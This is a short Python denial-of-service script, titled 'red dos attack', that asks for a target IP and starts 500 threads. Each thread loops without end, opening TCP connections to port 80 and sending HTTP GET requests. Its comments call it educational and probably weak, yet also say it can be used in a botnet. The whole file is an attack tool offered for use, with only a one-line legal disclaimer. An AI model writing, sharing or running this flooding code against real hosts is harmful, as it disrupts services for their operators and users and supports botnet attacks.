# red dos attack
# this is likley not strong enough to take down any hosts, and is used in an educational method,
# this can be used in a bot net.

import threading
import socket

print("///RED DOS ")
print("//please abide your countries law when using this tool")
targetIP = input("INPUT TARGET IP:")
# change this port number to the port of host
port = 80
Proxy = input("INPUT A PROXY IP:")
connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((targetIP, port))
        s.sendto(("GET /" + targetIP + " HTTP/1.1\r\n").encode("ascii"), (targetIP, port))
        s.sendto(("Host: " + Proxy + "\r\n\r\n").encode("ascii"), (targetIP, port))
        s.close()

        global connected
        connected += 1
        print(connected, "sent")


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
